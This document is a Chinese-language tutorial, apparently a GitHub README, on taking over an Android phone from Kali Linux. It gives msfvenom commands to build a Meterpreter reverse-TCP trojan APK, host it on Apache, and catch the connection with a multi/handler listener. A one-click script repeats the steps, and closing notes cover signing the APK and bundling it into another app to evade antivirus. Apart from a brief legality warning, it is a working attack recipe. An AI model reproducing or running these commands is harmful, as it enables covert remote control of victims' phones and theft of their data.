# 使用Kali入侵安卓手机
# 未经容许的入侵是违法行为！！！请不要随意模仿！！！
步骤：
1. SSH连接上kali<br>
![图像_2021-08-19_182808](https://user-images.githubusercontent.com/71908235/130053586-a06330ed-4068-409d-91dd-afdc25cb422b.png)
2. 生成一个木马apk 命令：msfvenom -p android/meterpreter/reverse_tcp LHOST=这里填kali的IP地址 LPOST=8888 R > app.apk<br>
4. 输入service apache2 start开启服务器服务，再输入sudo cp app.apk /var/www/html将生成的apk文件复制到html文件夹下，然后执行rm /var/www/html/index.html删除掉自带的网页<br>
![图像_2021-08-19_184536](https://user-images.githubusercontent.com/71908235/130055912-8b0e36ef-549f-403a-84f9-ee3ebe2c3271.png)<br>
5. 打开msfconsole（直接粘贴至控制台即可），等待到">"字样出现时继续操作<br>
![图像_2021-08-19_184838](https://user-images.githubusercontent.com/71908235/130056307-6e614687-508a-4182-b686-fe3f4b7e076f.png)
6. 输入use exploit/multi/handler<br>
![图像_2021-08-19_185337](https://user-images.githubusercontent.com/71908235/130056841-85082b3f-a0f4-4bcf-86d5-13a16626c9c9.png)
7. 输入set payload android/meterpreter/reverse_tcp<br>
![图像_2021-08-19_190033](https://user-images.githubusercontent.com/71908235/130057714-9e8f20b2-6fea-4bda-881c-6ef160118e05.png)
8. 输入options，发现HOST和PORT没有设置，设置host和post未创建apk时的IP地址和端口：<br>
![图像_2021-08-19_190220](https://user-images.githubusercontent.com/71908235/130057928-3c2aae58-cf13-4a67-aea4-079be575286d.png)
[![fqVcSH.png](https://z3.ax1x.com/2021/08/19/fqVcSH.png)](https://imgtu.com/i/fqVcSH)
9. 输入exploit开启监听出现Started reverse TCP handler on 时就成功开启了<br>
[![fqVzkT.png](https://z3.ax1x.com/2021/08/19/fqVzkT.png)](https://imgtu.com/i/fqVzkT)
10. 在靶机上访问Kali的IP地址，找到app.apk然后就可以在Kali上控制手机了<br>
<br>
一键脚本：<br>
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.110 LPOST=8888 R > app.apk<br>
service apache2 start<br>
sudo cp app.apk /var/www/html<br>
rm /var/www/html/index.html<br>
msfconsole<br>
use exploit/multi<br>
set payload android/meterpreter/reverse_tcp<br>
set LPORT=8888<br>
set LHOST=192.168.1.110<br>
exploit<br>
<br>
注：<br>
1. 可以使用zipalign对apk进行对齐 zipalign -v 4 text.apk text1.apk<br>
2. 可以生成密钥对 例如 keytool -genkey -v -keystore cg.keystore -alias cg -keyalg RSA -keysize 2048 -validity 10000  模板keytool -genkeypair -keystore 密钥库名 -alias 密钥别名 -validity 天数 -keyalg RSA<br>
3. 可以对apk签名 例如 apksigner sign --ks cg.keystore --ks-key-alias cg text1.apk 模板apksigner sign --ks 密钥库名 --ks-key-alias 密钥别名 text1.apk<br>
4. 可以对apk进行签名验证apksigner verify -v --print-certs text1.apk<br>
还有：直接使用msfvenom生成的裸马，过不了免杀，版本也低，安装不了，捆绑是最简单的，然后做好签名优化就行<br>
